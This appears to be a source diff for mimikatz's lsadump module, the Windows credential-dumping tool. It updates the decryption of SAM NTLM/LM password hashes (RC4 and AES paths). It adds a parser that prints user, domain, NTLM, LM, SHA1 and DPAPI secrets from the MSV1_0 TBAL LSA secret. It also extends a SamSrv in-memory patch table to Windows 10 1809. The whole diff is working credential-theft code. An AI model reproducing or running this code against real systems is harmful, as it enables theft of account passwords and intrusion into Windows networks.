@@ -396,46 +396,65 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 	CRYPTO_BUFFER cypheredHashBuffer = {0, 0, NULL}, keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
 	PVOID out;
 	DWORD len;
-
+	
 	if(pSamHash->offset)
 	{
-		switch(pHash->Revision)
+		//if(pSamHash->lenght == LM_NTLM_HASH_LENGTH)
+		//{
+		//	MD5Init(&md5ctx);
+		//	MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+		//	MD5Update(&md5ctx, &rid, sizeof(DWORD));
+		//	MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
+		//	MD5Final(&md5ctx);
+		//	cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+		//	if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
+		//	{
+		//		RtlCopyMemory(cypheredHashBuffer.Buffer, pHash, cypheredHashBuffer.Length);
+		//		if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
+		//			PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+		//	}
+		//}
+		//else
 		{
-		case 1:
-			if(pSamHash->lenght >= sizeof(SAM_HASH))
+
+			switch(pHash->Revision)
 			{
-				MD5Init(&md5ctx);
-				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-				MD5Update(&md5ctx, &rid, sizeof(DWORD));
-				MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
-				MD5Final(&md5ctx);
-				cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
-				if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
+			case 1:
+				if(pSamHash->lenght >= sizeof(SAM_HASH))
 				{
-					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
-					if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
-						PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
-				}
-			}
-			break;
-		case 2:
-			pHashAes = (PSAM_HASH_AES) pHash;
-			if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
-			{
-				if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
-				{
-					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
+					MD5Init(&md5ctx);
+					MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+					MD5Update(&md5ctx, &rid, sizeof(DWORD));
+					MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
+					MD5Final(&md5ctx);
+					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
 					if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
 					{
-						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
-						status = TRUE;
+						RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
+						if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
+							PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
 					}
-					LocalFree(out);
 				}
+				break;
+			case 2:
+				pHashAes = (PSAM_HASH_AES) pHash;
+				if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
+				{
+					if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
+					{
+						cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
+						if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
+						{
+							RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
+							status = TRUE;
+						}
+						LocalFree(out);
+					}
+				}
+				break;
+			default:
+				PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
 			}
-			break;
-		default:
-			PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
 		}
 		if(status)
 			kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM" ) : (isHistory ? L"lm  " : L"LM  "), isHistory);
@@ -1051,6 +1070,8 @@ void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PC
 	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
 	BOOL isStringOk = FALSE;
 	PVOID bufferHash[SHA_DIGEST_LENGTH]; // ok for NTLM too
+	PKIWI_TBAL_MSV pTbal;
+
 	if(bufferSecret && szBytesSecrets)
 	{
 		kprintf(L"%s", prefix);
@@ -1085,6 +1106,31 @@ void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PC
 			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), SHA_DIGEST_LENGTH, 0);
 			kprintf(L" / ");
 			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD) + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, 0);
+		}
+		else if(_wcsnicmp(secretName, L"M$_MSV1_0_TBAL_PRIMARY_", 23) == 0)
+		{
+			pTbal = (PKIWI_TBAL_MSV) bufferSecret;
+			kprintf(L"   User   : %.*s\n    Domain : %.*s", pTbal->UserName.Length / sizeof(wchar_t), (PBYTE) pTbal + pTbal->UserName.Buffer, pTbal->DomainName.Length / sizeof(wchar_t), (PBYTE) pTbal + pTbal->DomainName.Buffer);
+			if(pTbal->flags & 1)
+			{
+				kprintf(L"\n    * NTLM : ");
+				kull_m_string_wprintf_hex(pTbal->NtOwfPassword, sizeof(pTbal->NtOwfPassword), 0);
+			}
+			if(pTbal->flags & 2)
+			{
+				kprintf(L"\n    * LM   : ");
+				kull_m_string_wprintf_hex(pTbal->LmOwfPassword, sizeof(pTbal->LmOwfPassword), 0);
+			}
+			if(pTbal->flags & 4)
+			{
+				kprintf(L"\n    * SHA1 : ");
+				kull_m_string_wprintf_hex(pTbal->ShaOwPassword, sizeof(pTbal->ShaOwPassword), 0);
+			}
+			if(pTbal->flags & 8)
+			{
+				kprintf(L"\n    * DPAPI: ");
+				kull_m_string_wprintf_hex(pTbal->DPAPIProtected, sizeof(pTbal->DPAPIProtected), 0);
+			}
 		}
 	}
 }
@@ -1166,6 +1212,7 @@ KULL_M_PATCH_GENERIC SamSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
 	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-19}},
 	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
+	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
